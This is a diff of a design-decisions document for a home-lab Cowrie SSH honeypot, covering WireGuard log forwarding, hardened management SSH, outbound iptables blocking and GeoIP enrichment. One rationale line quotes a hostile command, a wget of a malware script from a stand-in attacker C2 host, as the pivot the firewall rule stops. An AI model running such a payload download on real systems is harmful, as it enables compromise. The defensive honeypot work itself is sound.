@@ -26,9 +26,9 @@ The VPS absorbs all internet-facing risk. The home network IP never appears anyw
 
 **Decision:** Use WireGuard for the VPS-to-home-lab tunnel rather than an SSH reverse tunnel or plain syslog.
 
-**Rationale:** SSH reverse tunnels work but require keepalive configuration, are stateful, and break when the connection drops — requiring a reconnect script and error handling. Plain syslog is unencrypted, which means log data transits the internet in cleartext.
+**Rationale:** SSH reverse tunnels work but require keepalive configuration, are stateful, and break when the connection drops, requiring a reconnect script and error handling. Plain syslog is unencrypted, which means log data transits the internet in cleartext.
 
-WireGuard is stateless — if the network drops and comes back, the tunnel resumes automatically without any intervention. The cryptographic authentication means no unauthorized device can inject traffic through the tunnel, even if they know the endpoint IP. OPNsense has native WireGuard support, making the home-side configuration straightforward.
+WireGuard is stateless, if the network drops and comes back, the tunnel resumes automatically without any intervention. The cryptographic authentication means no unauthorized device can inject traffic through the tunnel, even if they know the endpoint IP. OPNsense has native WireGuard support, making the home-side configuration straightforward.
 
 **Tradeoff acknowledged:** WireGuard requires managing a keypair on both ends. The VPS public key must be updated in OPNsense whenever the VPS is rebuilt. This is a minor operational burden documented in the deployment guide.
 
@@ -42,9 +42,9 @@ WireGuard is stateless — if the network drops and comes back, the tunnel resum
 
 **Decision:** The VPS initiates the WireGuard connection outbound to OPNsense's WAN IP. OPNsense acts as the WireGuard server but receives connections rather than initiating them.
 
-**Rationale:** The home WAN IP (`192.168.4.58`) is assigned by the Eero router, which sits upstream of OPNsense. The Eero NATs all traffic, meaning OPNsense's "WAN" is actually a private IP — not routable from the internet. The VPS cannot dial into `192.168.4.58` from the internet because that address doesn't exist on the public internet.
+**Rationale:** The home WAN IP (`192.168.4.58`) is assigned by the Eero router, which sits upstream of OPNsense. The Eero NATs all traffic, meaning OPNsense's "WAN" is actually a private IP, not routable from the internet. The VPS cannot dial into `192.168.4.58` from the internet because that address doesn't exist on the public internet.
 
-However, OPNsense can reach the VPS's public IP (`174.138.35.11`) outbound without any changes to the Eero — outbound UDP is typically unrestricted. By having the VPS listen and OPNsense dial out, the double-NAT is irrelevant.
+However, OPNsense can reach the VPS's public IP (`174.138.35.11`) outbound without any changes to the Eero, outbound UDP is typically unrestricted. By having the VPS listen and OPNsense dial out, the double-NAT is irrelevant.
 
 **Tradeoff acknowledged:** This means OPNsense must have the VPS's endpoint address (`174.138.35.11:51820`) in its peer config. If the VPS IP changes (e.g., after a rebuild), OPNsense must be updated.
 
@@ -58,11 +58,11 @@ However, OPNsense can reach the VPS's public IP (`174.138.35.11`) outbound witho
 
 **Decision:** Move the real SSH daemon to port 2222, disable password authentication, restrict access to Tailscale IP only via Cloud Firewall, and use ed25519 key authentication.
 
-**Rationale:** Port 22 is fully consumed by Cowrie. Any connection to port 22 goes directly to the fake shell — including management connections if the operator accidentally connects to port 22. Moving management SSH to port 2222 creates an unambiguous separation.
+**Rationale:** Port 22 is fully consumed by Cowrie. Any connection to port 22 goes directly to the fake shell, including management connections if the operator accidentally connects to port 22. Moving management SSH to port 2222 creates an unambiguous separation.
 
 Restricting port 2222 to the Tailscale IP (`100.72.171.104`) means the management port is invisible to internet scanners. Even if an attacker discovers the VPS IP and tries port 2222, the DigitalOcean Cloud Firewall drops the connection before it reaches the VPS.
 
-Key-only authentication means even if an attacker reaches port 2222 (e.g., from within the Tailscale network), they cannot brute-force their way in — no password is accepted.
+Key-only authentication means even if an attacker reaches port 2222 (e.g., from within the Tailscale network), they cannot brute-force their way in, no password is accepted.
 
 **Tradeoff acknowledged:** If Tailscale is down or the Tailscale IP changes, management SSH becomes inaccessible via the normal method. Mitigation: DigitalOcean's web console provides emergency access that bypasses all SSH rules entirely.
 
@@ -80,9 +80,9 @@ Key-only authentication means even if an attacker reaches port 2222 (e.g., from 
 iptables -I OUTPUT -m owner --uid-owner 999 -j DROP
 ```
 
-**Rationale:** Cowrie runs as UID 999 inside the Docker container. If an attacker identifies the fake shell and attempts to pivot — for example, by running `wget http://attacker-c2/real-malware.sh` — the iptables rule drops the outbound connection before it leaves the VPS. The attacker cannot download tools, cannot phone home, and cannot use the VPS as a pivot point.
+**Rationale:** Cowrie runs as UID 999 inside the Docker container. If an attacker identifies the fake shell and attempts to pivot, for example, by running `wget http://attacker-c2/real-malware.sh`, the iptables rule drops the outbound connection before it leaves the VPS. The attacker cannot download tools, cannot phone home, and cannot use the VPS as a pivot point.
 
-This is defense-in-depth operating below the Docker layer. Docker networking and the DigitalOcean Cloud Firewall both restrict inbound traffic, but this rule restricts outbound from a specific UID — something neither Docker nor the cloud firewall can do.
+This is defense-in-depth operating below the Docker layer. Docker networking and the DigitalOcean Cloud Firewall both restrict inbound traffic, but this rule restricts outbound from a specific UID, something neither Docker nor the cloud firewall can do.
 
 **Tradeoff acknowledged:** This rule blocks Cowrie from making any outbound connections. Cowrie itself does not need to initiate outbound connections for normal operation (logging, listening), so this has no operational impact on the honeypot.
 
@@ -113,7 +113,7 @@ The combined resource footprint is low enough for the VPS to handle comfortably 
 
 **Decision:** GeoIP enrichment runs on Ubuntu Server via hourly cron, not on the VPS.
 
-**Rationale:** Running the enrichment on the VPS would require installing Python dependencies and MaxMind databases (75MB) on a resource-constrained 1GB Droplet that is already running three Docker containers. More importantly, the enrichment script doesn't need to be on the VPS — it only needs access to the log files, which land on Ubuntu Server via rsync.
+**Rationale:** Running the enrichment on the VPS would require installing Python dependencies and MaxMind databases (75MB) on a resource-constrained 1GB Droplet that is already running three Docker containers. More importantly, the enrichment script doesn't need to be on the VPS, it only needs access to the log files, which land on Ubuntu Server via rsync.
 
 Keeping the VPS lean reduces attack surface. The VPS runs: Docker, WireGuard, rsync, fail2ban, Tailscale. Nothing else. Every additional package on an internet-exposed host is a potential vulnerability surface.
 
@@ -127,7 +127,7 @@ Keeping the VPS lean reduces attack surface. The VPS runs: Docker, WireGuard, rs
 
 **Decision:** Mount the Cowrie log path as `./logs:/cowrie/cowrie-git/var/log/cowrie` in docker-compose.yml.
 
-**Rationale:** The correct internal Cowrie log path is `/cowrie/cowrie-git/var/log/cowrie`, not the commonly documented `/cowrie/var/log/cowrie`. The correct path was identified by examining the running container's file structure. Using the wrong path results in logs being written inside the container with no host-side visibility — the container must be queried directly for logs, and they are lost on container rebuild.
+**Rationale:** The correct internal Cowrie log path is `/cowrie/cowrie-git/var/log/cowrie`, not the commonly documented `/cowrie/var/log/cowrie`. The correct path was identified by examining the running container's file structure. Using the wrong path results in logs being written inside the container with no host-side visibility, the container must be queried directly for logs, and they are lost on container rebuild.
 
 This was a non-obvious deployment issue. The volume mount path depends on how the specific Docker image was built, not on Cowrie's default configuration. It is documented here explicitly because it would cause a silent failure (no logs on host) that is easy to miss.
 
@@ -137,8 +137,8 @@ This was a non-obvious deployment issue. The volume mount path depends on how th
 
 ## Design Tension: Operational Security vs. Documentation
 
-One deliberate tension in this project: the deployment guide documents real IP addresses, real credentials patterns, and real configuration details. This is intentional — the portfolio value of this project comes from demonstrating real operational security understanding, not from generic examples.
+One deliberate tension in this project: the deployment guide documents real IP addresses, real credentials patterns, and real configuration details. This is intentional, the portfolio value of this project comes from demonstrating real operational security understanding, not from generic examples.
 
-All sensitive values (private keys, license keys) are either redacted (`<REDACTED>`) or have been rotated since documentation was written. The VPS is a disposable asset designed to be rebuilt. The home network architecture described is the real architecture — documenting it accurately is more professionally valuable than obscuring it.
+All sensitive values (private keys, license keys) are either redacted (`<REDACTED>`) or have been rotated since documentation was written. The VPS is a disposable asset designed to be rebuilt. The home network architecture described is the real architecture, documenting it accurately is more professionally valuable than obscuring it.
 
 The risk model: anyone who reads this documentation and the home lab documentation knows the VLAN structure and IP addressing of a private home lab. That information has no operational value to an attacker without physical or network access to the lab. The educational and portfolio value of accurate documentation far outweighs this theoretical risk.
